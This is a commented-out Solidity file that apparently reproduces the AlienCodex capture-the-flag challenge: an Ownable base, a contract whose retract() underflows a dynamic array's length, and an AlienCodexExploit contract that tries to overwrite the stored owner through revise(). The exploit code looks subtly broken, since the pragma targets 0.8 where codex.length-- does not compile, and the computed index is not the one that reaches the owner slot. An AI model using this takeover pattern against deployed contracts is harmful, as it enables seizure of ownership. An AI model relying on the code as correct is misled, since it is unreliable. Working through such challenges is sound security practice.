// // SPDX-License-Identifier: MIT
// pragma solidity ^0.8.0;

// contract Ownable {
//     address public owner;

//     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

//     constructor() {
//         owner = msg.sender;
//     }

//     modifier onlyOwner() {
//         require(msg.sender == owner, "Ownable: caller is not the owner");
//         _;
//     }

//     function transferOwnership(address newOwner) public onlyOwner {
//         require(newOwner != address(0), "Ownable: new owner is the zero address");
//         emit OwnershipTransferred(owner, newOwner);
//         owner = newOwner;
//     }
// }

// contract AlienCodex is Ownable {
//     bool public contact;
//     bytes32[] public codex;

//     modifier contacted() {
//         assert(contact);
//         _;
//     }

//     function makeContact() public {
//         contact = true;
//     }

//     function record(bytes32 _content) public contacted {
//         codex.push(_content);
//     }

//     function retract() public contacted {
//         codex.length--;
//     }

//     function revise(uint256 i, bytes32 _content) public contacted {
//         codex[i] = _content;
//     }
// }

// contract AlienCodexExploit {
//     AlienCodex public target;

//     constructor(address _target) public {
//         target = AlienCodex(_target);
//     }

//     function exploit() public {
//         // Step 1: Trigger contact to true
//         target.makeContact();

//         // Step 2: Underflow the codex length
//         target.retract();

//         // Step 3: Calculate the slot to overwrite `owner` and use revise
//         uint256 slot = uint256(keccak256(abi.encodePacked(uint256(1))));
//         target.revise(slot, bytes32(uint256(uint160(msg.sender))));  // Overwrite owner
//     }
// }